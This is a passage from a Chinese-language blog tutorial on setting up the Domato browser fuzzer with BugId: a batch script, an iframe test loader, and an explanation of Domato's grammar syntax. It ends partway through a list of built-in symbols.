class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@ECHO <span class="keyword">OFF</span></span><br><span class="line">SET BASE_FOLDER=C:\Fuzzing</span><br><span class="line">SET PYTHON_EXE=C:\Python27\python.exe</span><br><span class="line"></span><br><span class="line">:: What browser do we want <span class="keyword">to</span> fuzz? (<span class="string">&quot;chrome&quot;</span> | <span class="string">&quot;edge&quot;</span> | <span class="string">&quot;firefox&quot;</span> | <span class="string">&quot;msie&quot;</span>)</span><br><span class="line">SET TARGET_BROWSER=msie</span><br><span class="line">:: How many HTML <span class="keyword">files</span> shall we teach during each loop?</span><br><span class="line">SET NUMBER_OF_FILES=<span class="number">100</span></span><br><span class="line">:: How long does it take BugId <span class="keyword">to</span> start the browser <span class="keyword">and</span> <span class="keyword">load</span> an HTML file?</span><br><span class="line">SET BROWSER_LOAD_TIMEOUT_IN_SECONDS=<span class="number">30</span></span><br><span class="line">:: How long does it take the browser <span class="keyword">to</span> render each HTML file?</span><br><span class="line">SET AVERAGE_PAGE_LOAD_TIME_IN_SECONDS=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">:: Optionally configurable</span><br><span class="line">SET BUGID_FOLDER=%BASE_FOLDER%\BugId</span><br><span class="line">SET DOMATO_FOLDER=%BASE_FOLDER%\domato-master</span><br><span class="line">SET TESTS_FOLDER=%BASE_FOLDER%\Tests</span><br><span class="line">SET REPORT_FOLDER=%BASE_FOLDER%\Report</span><br><span class="line">SET RESULT_FOLDER=%BASE_FOLDER%\Results</span><br><span class="line">:: Store our results in a folder named after the target:</span><br><span class="line"><span class="keyword">IF</span> <span class="keyword">NOT</span> EXIST <span class="string">&quot;%RESULT_FOLDER%\%TARGET_BROWSER%&quot;</span> <span class="keyword">MKDIR</span> <span class="string">&quot;%RESULT_FOLDER%\%TARGET_BROWSER%&quot;</span></span><br><span class="line"></span><br><span class="line">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><span class="line">:: Repeatedly generate tests <span class="keyword">and</span> <span class="keyword">run</span> them in the browser.</span><br><span class="line">:LOOP</span><br><span class="line">  <span class="keyword">CALL</span> :GENERATE</span><br><span class="line">  <span class="keyword">IF</span> ERRORLEVEL <span class="number">1</span> EXIT /B <span class="number">1</span></span><br><span class="line">  <span class="keyword">CALL</span> :TEST</span><br><span class="line">  <span class="keyword">IF</span> ERRORLEVEL <span class="number">1</span> EXIT /B <span class="number">1</span></span><br><span class="line">  <span class="keyword">GOTO</span> :LOOP</span><br><span class="line"></span><br><span class="line">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><span class="line">:: Generate test HTML <span class="keyword">files</span></span><br><span class="line">:GENERATE</span><br><span class="line">  <span class="comment">REM Delete old files.</span></span><br><span class="line">  DEL <span class="string">&quot;%TESTS_FOLDER%\fuzz-*.html&quot;</span> /Q &gt;nul <span class="number">2</span>&gt;nul</span><br><span class="line">  <span class="comment">REM Generate new HTML files.</span></span><br><span class="line">  <span class="string">&quot;%PYTHON_EXE%&quot;</span> <span class="string">&quot;%DOMATO_FOLDER%\generator.py&quot;</span> --output_dir <span class="string">&quot;%TESTS_FOLDER%&quot;</span> --no_of_files %NUMBER_OF_FILES%</span><br><span class="line">  <span class="keyword">IF</span> ERRORLEVEL <span class="number">1</span> EXIT /B <span class="number">1</span></span><br><span class="line">  EXIT /B <span class="number">0</span></span><br><span class="line"></span><br><span class="line">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><span class="line">:: <span class="keyword">Run</span> browser in BugId <span class="keyword">and</span> <span class="keyword">load</span> test HTML <span class="keyword">files</span></span><br><span class="line">:TEST</span><br><span class="line">  <span class="comment">REM Delete old report if any.</span></span><br><span class="line">  <span class="keyword">IF</span> <span class="keyword">NOT</span> EXIST <span class="string">&quot;%REPORT_FOLDER%&quot;</span> (</span><br><span class="line">    <span class="keyword">MKDIR</span> <span class="string">&quot;%REPORT_FOLDER%&quot;</span></span><br><span class="line">  ) <span class="keyword">ELSE</span> (</span><br><span class="line">    DEL <span class="string">&quot;%REPORT_FOLDER%\*.html&quot;</span> /Q &gt;nul <span class="number">2</span>&gt;nul</span><br><span class="line">  )</span><br><span class="line">  <span class="comment">REM Guess how long the browser needs to run to process all tests.</span></span><br><span class="line">  <span class="comment">REM This is used by BugId to terminate the browser in case it survives all tests.</span></span><br><span class="line">  SET /A MAX_BROWSER_RUN_TIME=%BROWSER_LOAD_TIMEOUT_IN_SECONDS% + %AVERAGE_PAGE_LOAD_TIME_IN_SECONDS% * %NUMBER_OF_FILES%</span><br><span class="line">  <span class="comment">REM Start browser in BugId...</span></span><br><span class="line">  <span class="string">&quot;%PYTHON_EXE%&quot;</span> <span class="string">&quot;%BUGID_FOLDER%\BugId.py&quot;</span> <span class="string">&quot;%TARGET_BROWSER%&quot;</span> <span class="string">&quot;--sReportFolderPath=\&quot;%REPORT_FOLDER:\=\\%\&quot;&quot;</span> --nApplicationMaxRunTimeInSeconds=%MAX_BROWSER_RUN_TIME% -- <span class="string">&quot;file://%TESTS_FOLDER%\index.html&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">IF</span> ERRORLEVEL <span class="number">2</span> (</span><br><span class="line">    ECHO - <span class="keyword">ERROR</span> %ERRORLEVEL%.</span><br><span class="line">    <span class="comment">REM ERRORLEVEL 2+ means something went wrong.</span></span><br><span class="line">    ECHO Please <span class="keyword">fix</span> the issue before continuing...</span><br><span class="line">    EXIT /B <span class="number">1</span></span><br><span class="line">  ) <span class="keyword">ELSE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> ERRORLEVEL <span class="number">1</span> (</span><br><span class="line">    EXIT /B <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line">  ECHO Crash detected!</span><br><span class="line"></span><br><span class="line">  <span class="comment">REM Create results sub-folder based on report file name and copy test files</span></span><br><span class="line">  <span class="comment">REM and report.</span></span><br><span class="line">  <span class="keyword">FOR</span> %%I IN (<span class="string">&quot;%REPORT_FOLDER%\*.html&quot;</span>) DO (</span><br><span class="line">    <span class="keyword">CALL</span> :COPY_TO_UNIQUE_CRASH_FOLDER <span class="string">&quot;%RESULT_FOLDER%\%%~nxI&quot;</span></span><br><span class="line">    EXIT /B <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line">  ECHO BugId reported finding a crash, but <span class="keyword">not</span> report file could be found!?</span><br><span class="line">  EXIT /B <span class="number">1</span></span><br><span class="line"></span><br><span class="line">:COPY_TO_UNIQUE_CRASH_FOLDER</span><br><span class="line">  SET REPORT_FILE=%~nx1</span><br><span class="line">  <span class="comment">REM We want to remove the &quot;.html&quot; extension from the report file name to get</span></span><br><span class="line">  <span class="comment">REM a unique folder name:</span></span><br><span class="line">  SET UNIQUE_CRASH_FOLDER=%RESULT_FOLDER%\%TARGET_BROWSER%\%REPORT_FILE:~<span class="number">0</span>,-<span class="number">5</span>%</span><br><span class="line">  <span class="keyword">IF</span> EXIST <span class="string">&quot;%UNIQUE_CRASH_FOLDER%&quot;</span> (</span><br><span class="line">    ECHO Repro <span class="keyword">and</span> report already saved after previous test detected the same issue.</span><br><span class="line">    EXIT /B <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line">  ECHO Copying report <span class="keyword">and</span> repro <span class="keyword">to</span> %UNIQUE_CRASH_FOLDER% folder...</span><br><span class="line">  <span class="comment">REM Move report to unique folder</span></span><br><span class="line">  <span class="keyword">MKDIR</span> <span class="string">&quot;%UNIQUE_CRASH_FOLDER%&quot;</span></span><br><span class="line">  MOVE <span class="string">&quot;%REPORT_FOLDER%\%REPORT_FILE%&quot;</span> <span class="string">&quot;%UNIQUE_CRASH_FOLDER%\report.html&quot;</span></span><br><span class="line">  <span class="comment">REM Copy repro</span></span><br><span class="line">  <span class="keyword">MKDIR</span> <span class="string">&quot;%UNIQUE_CRASH_FOLDER%\Repro&quot;</span></span><br><span class="line">  COPY <span class="string">&quot;%TESTS_FOLDER%\*.html&quot;</span> <span class="string">&quot;%UNIQUE_CRASH_FOLDER%\Repro&quot;</span></span><br><span class="line">  ECHO Report <span class="keyword">and</span> repro copied <span class="keyword">to</span> %UNIQUE_CRASH_FOLDER% folder.</span><br><span class="line">  EXIT /B <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> oIFrameElement = <span class="built_in">document</span>.getElementById(<span class="string">&quot;IFrame&quot;</span>),</span></span><br><span class="line"><span class="javascript">          nPageLoadTimeoutInSeconds = <span class="number">5</span>,</span></span><br><span class="line"><span class="javascript">          uIndex = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">      onload = <span class="function"><span class="keyword">function</span> <span class="title">fLoadNext</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Show progress in title bar.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> sIndex = <span class="string">&quot;&quot;</span> + uIndex++;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (sIndex.length &lt; <span class="number">5</span>) sIndex = <span class="string">&quot;0&quot;</span> + sIndex;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> sTestURL = <span class="string">&quot;fuzz-&quot;</span> + sIndex + <span class="string">&quot;.html&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.title = <span class="string">&quot;Loading test &quot;</span> + sTestURL + <span class="string">&quot;...&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Add iframe element that loads the next test case.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oIFrame = <span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>)),</span></span><br><span class="line"><span class="javascript">            bFinished = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        oIFrame.setAttribute(<span class="string">&quot;sandbox&quot;</span>, <span class="string">&quot;allow-scripts&quot;</span>);</span></span><br><span class="line"><span class="javascript">        oIFrame.setAttribute(<span class="string">&quot;src&quot;</span>, sTestURL);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Hook load event handler and add timeout to remove the iframe when the test is finished.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">          oIFrame.contentWindow.addEventListener(<span class="string">&quot;load&quot;</span>, fCleanupAndLoadNext);</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// This may cause an exception because some browsers treat different files loaded from the</span></span></span><br><span class="line"><span class="javascript">          <span class="comment">// local file system as comming from different origins.</span></span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> xTimeout = <span class="built_in">setTimeout</span>(fCleanupAndLoadNext, nPageLoadTimeoutInSeconds * <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fCleanupAndLoadNext</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// Both the load event and the timeout can call this function; make sure we only execute once:</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!bFinished) &#123;</span></span><br><span class="line"><span class="javascript">            bFinished = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;Finished test &quot;</span> + sTestURL + <span class="string">&quot;...&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// Let&#x27;s give the page another 5 seconds to render animations etc.</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="comment">// Remove the iframe from the document to delete the test.</span></span></span><br><span class="line"><span class="javascript">              <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.removeChild(oIFrame);</span></span><br><span class="line"><span class="javascript">              &#125; <span class="keyword">catch</span> (e) &#123;&#125;;</span></span><br><span class="line"><span class="javascript">            &#125;, <span class="number">5000</span>);</span></span><br><span class="line"><span class="javascript">            fLoadNext();</span></span><br><span class="line"><span class="javascript">          &#125;;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">      &#125;;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行截图</p><p><img src="/2022/04/14/domato101/image-20211223215010429.png" alt="image-20211223215010429"></p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><h3 id="generator-py"><a href="#generator-py" class="headerlink" title="generator.py"></a>generator.py</h3><p>是主脚本，使用了grammar.py 作为库，并包含fuzzer的额外代码。</p><h3 id="grammar-py"><a href="#grammar-py" class="headerlink" title="grammar.py"></a>grammar.py</h3><p>包含大多数与应用程序无关的生成引擎，因此可以在其他（即非DOM）基于生成的模糊器中使用。</p><p>.txt 文件包含语法定义。有 3 个主要文件，html.txt、css.txt 和 js.txt，分别包含 HTML、CSS 和 JavaScript 语法。这些根语法文件可能包含来自其他文件的内容。</p><p>该文件可以当作库进行使用，当我们需要使用自定义语法时，可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> grammar <span class="keyword">import</span> Grammar</span><br><span class="line"></span><br><span class="line">my_grammar = Grammar()</span><br><span class="line">my_grammar.parse_from_file(<span class="string">&#x27;input_file.txt&#x27;</span>)</span><br><span class="line">result_string = my_grammar.generate_symbol(<span class="string">&#x27;symbol_name&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><p>Domato 基于一个引擎，该引擎以下面指定的简单格式给出上下文无关的文法，然后从该文法生成样本。</p><p>语法被描述为具有以下基本格式的一组规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;symbol&gt; = a mix of constants and &lt;other_symbol&gt;s</span><br></pre></td></tr></table></figure><p>每个语法规则都包含由等号左侧和右侧。左侧包含一个符号，而右侧包含该符号的实现。</p><p>考虑以下 CSS 语法部分的简化示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;cssrule&gt; = &lt;selector&gt; &#123; &lt;declaration&gt; &#125;</span><br><span class="line">&lt;selector&gt; = <span class="selector-tag">a</span></span><br><span class="line">&lt;selector&gt; = <span class="selector-tag">b</span></span><br><span class="line">&lt;declaration&gt; = <span class="attribute">width</span>:<span class="number">100%</span></span><br></pre></td></tr></table></figure><p>使用上面的语法可以生成如下的代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">width</span>:<span class="number">100%</span> &#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">b</span> &#123; <span class="attribute">width</span>:<span class="number">100%</span> &#125;</span><br></pre></td></tr></table></figure><p>也可以对<code>selector</code>进行加权</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;selector <span class="selector-tag">p</span>=<span class="number">0.9</span>&gt; = <span class="selector-tag">a</span></span><br><span class="line">&lt;selector <span class="selector-tag">p</span>=<span class="number">0.1</span>&gt; = <span class="selector-tag">b</span></span><br></pre></td></tr></table></figure><p>这样字符串 ‘a’ 将比 ‘b’ 更频繁地输出。</p><h4 id="生成编程语言代码"><a href="#生成编程语言代码" class="headerlink" title="生成编程语言代码"></a>生成编程语言代码</h4><p>要生成编程语言代码，可以使用类似的语法，但存在一些差异。编程语言语法的每一行都将对应于输出行。正因为如此，文法语法将更加自由，以允许用各种编程语言表达结构。其次，当生成一行时，除了输出该行之外，还可以创建一个或多个变量，这些变量可以在生成其他行时重复使用。同样，让我们看一下简化的示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!varformat fuzzvar%<span class="number">05</span>d</span><br><span class="line">!lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">!begin lines</span><br><span class="line">&lt;new element&gt; = document<span class="selector-class">.getElementById</span>(&quot;&lt;string min=<span class="number">97</span> max=<span class="number">122</span>&gt;&quot;);</span><br><span class="line">&lt;element&gt;<span class="selector-class">.doSomething</span>();</span><br><span class="line">!end lines</span><br></pre></td></tr></table></figure><p>如果引擎生成 5 行，我们可能会得到如下结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; var00001 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;hw&quot;</span>); &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line"><span class="keyword">try</span> &#123; var00001.doSomething(); &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line"><span class="keyword">try</span> &#123; var00002 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;feezcqbndf&quot;</span>); &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line"><span class="keyword">try</span> &#123; var00002.doSomething(); &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line"><span class="keyword">try</span> &#123; var00001.doSomething(); &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br></pre></td></tr></table></figure><p>对上面的代码进行解释</p><ul><li>编程语言被限制在 ‘!begin lines’ 和 ‘!end lines’ 之间。这样语法解析器更容易识别各个范围。</li><li><code>&lt;new element&gt;</code>和<code>&lt;element&gt;</code>的区别在于： <code>&lt;new element&gt;</code>表示变量赋值，而<code>&lt;element&gt;</code>表示了变量属性调用。</li><li><code>&lt;string&gt;</code> 是内置符号之一，无需定义。</li><li>[可选]  !varformat 定义要使用变量命名的格式。</li><li>[可选]  !lineguard 定义在每一行周围插入的附加代码，以便捕获异常或执行其他任务。这样您就无需为每一行单独编写它。</li><li>除了 ‘!begin lines’ 和 ‘!end lines’ 之外，您还可以使用 ‘!begin helperlines’ 和 ‘!end helperlines’ 定义辅助输出行（）</li></ul><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>该行第一个“#”字符之后的所有内容都被视为注释，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is a comment</span></span><br></pre></td></tr></table></figure><h4 id="防止无限递归"><a href="#防止无限递归" class="headerlink" title="防止无限递归"></a>防止无限递归</h4><p>语法中有种方法可以告诉fuzzer哪些规则是非递归的，即使达到了最大递归级别也可以安全使用。这是通过“非递归”属性完成的。下面给出一个例子。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!max_recursion <span class="number">10</span></span><br><span class="line">&lt;test root=true&gt; = &lt;foobar&gt;</span><br><span class="line">&lt;foobar&gt; = foo&lt;foobar&gt;</span><br><span class="line">&lt;foobar nonrecursive&gt; = bar</span><br></pre></td></tr></table></figure><p>可选选项 ‘!max_recursion’ 语句定义了最大递归深度级别（默认为 50）。第三行使用了递归调用，如果达到最大递归层数，生成器将强制结束递归语句的生成。</p><h4 id="include与import"><a href="#include与import" class="headerlink" title="include与import"></a>include与import</h4><p>在 Domato 中，<code>include</code>和<code>import</code>是不同的</p><p><code>include</code>比较简单，如下代码所示：将 other.txt 中的rules包含到当前rules中。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!include other<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p><code>import</code>的工作方式略有不同：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!import other<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>它会创建一个新的 Grammar() 对象，然后可以使用特殊<code>&lt;import&gt;</code>符号从当前语法中引用该对象，例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;cssrule&gt; = &lt;import <span class="selector-tag">from</span>=css<span class="selector-class">.txt</span> symbol=rule&gt;</span><br></pre></td></tr></table></figure><p>从<code>namespace</code>的角度考虑<code>include</code>和<code>import</code>：<code>include</code> 会将包含的语法放入单个<code>namespace</code>中，而 <code>import</code> 将创建一个新的<code>namespace</code>，然后可以使用<code>&lt;import&gt;</code>符号和通过 <code>from</code> 属性让其他<code>namespace</code>进行访问.</p><h4 id="使用-Python-代码"><a href="#使用-Python-代码" class="headerlink" title="使用 Python 代码"></a>使用 Python 代码</h4><p>当我们想在语法中调用自定义 Python 代码。例如，假设您想使用引擎生成 http 响应，并且您希望正文长度与“大小”标头相匹配。正常情况下普通语法规则很难实现，但我们可以通过自定义 Python 代码来轻松它，如下所示：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!begin function savesize</span><br><span class="line">  context<span class="selector-attr">[<span class="string">&#x27;size&#x27;</span>]</span> = ret_val</span><br><span class="line">!end function</span><br><span class="line"></span><br><span class="line">!begin function createbody</span><br><span class="line">  n = int(context<span class="selector-attr">[<span class="string">&#x27;size&#x27;</span>]</span>)</span><br><span class="line">  ret_val = &#x27;<span class="selector-tag">a</span>&#x27; * n</span><br><span class="line">!end function</span><br><span class="line"></span><br><span class="line">&lt;foo root&gt; = &lt;<span class="selector-tag">header</span>&gt;&lt;cr&gt;&lt;lf&gt;&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">header</span>&gt; = Size: &lt;int min=<span class="number">1</span> max=<span class="number">20</span> beforeoutput=savesize&gt;</span><br><span class="line">&lt;body&gt; = &lt;call function=createbody&gt;</span><br></pre></td></tr></table></figure><p>python 函数定义在 ‘!begin function <function_name>‘ 和 ‘!end function’ 命令之间。我们可以通过使用<code>beforeoutput</code>属性和使用<code>&lt;call&gt;</code>符号两种方式调用这些函数。</p><p>使用 <code>beforeoutput</code> 时，会在外部给调用的函数一个初始值，而这个初始值会被传递给<code>ret_val</code>。</p><p>使用<code>&lt;call&gt;</code>时，会将函数的结果保存在<code>ret_val</code>中，如果不给<code>ret_val</code>赋值默认为空。</p><p>您的 Python 代码可以访问以下变量：</p><ul><li><code>context</code>- 相当于一个字典，上面的例子中savesize函数使用了<code>key</code>对应了<code>size</code>，而<code>value</code>对应了<code>ret_val</code>。实际上就是通过<code>context</code>定义了变量。</li><li><code>attributes</code>- 相当于函数参数的传递。例如，类似于<code>&lt;call function=func foo=bar&gt;</code>，则<code>foo</code>的缺省值为”bar”。</li><li><code>ret_val</code>- 函数的返回值。使用<code>&lt;call&gt;</code>时默认为空，</li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>考虑另一个生成 html 样本的示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt; = &lt;lt&gt;<span class="selector-tag">html</span>&lt;gt&gt;&lt;head&gt;&lt;<span class="selector-tag">body</span>&gt;&lt;lt&gt;/<span class="selector-tag">html</span>&lt;gt&gt;</span><br><span class="line">&lt;head&gt; = &lt;lt&gt;head&lt;gt&gt;...&lt;lt&gt;/head&lt;gt&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt; = &lt;lt&gt;<span class="selector-tag">body</span>&lt;gt&gt;...&lt;lt&gt;/<span class="selector-tag">body</span>&lt;gt&gt;</span><br></pre></td></tr></table></figure><p>由于 ‘&lt;’ 和 ‘&gt;’ 在语法文件中会用到，因此我们在这里使用<code>&lt;lt&gt;</code>and<code>&lt;gt&gt;</code>代替。这些符号是内置的，不需要用户定义。所有内置符号的列表如下：</p><h5 id="内置符号"><a href="#内置符号" class="headerlink" title="内置符号"></a>内置符号</h5><p>以下符号具有特殊含义，用户不应重新定义：</p><ul><li><code>&lt;lt&gt;</code> - ‘&lt;’ 字符</li><li><code>&lt;gt&gt;</code> - ‘&gt;’ 字符</li><li><code>&lt;hash&gt;</code> - ‘＃’ 特点</li><li><code>&lt;cr&gt;</code> - CR 字符</li><li><code>&lt;lf&gt;</code> - LF 字符</li><li><code>&lt;space&gt;</code> - 空格字符</li><li><code>&lt;tab&gt;</code> - 制表符</li><li><code>&lt;ex&gt;</code>- ‘！特点</li><li><code>&lt;char&gt;</code>- 可用于使用 ‘code’ 属性生成任意 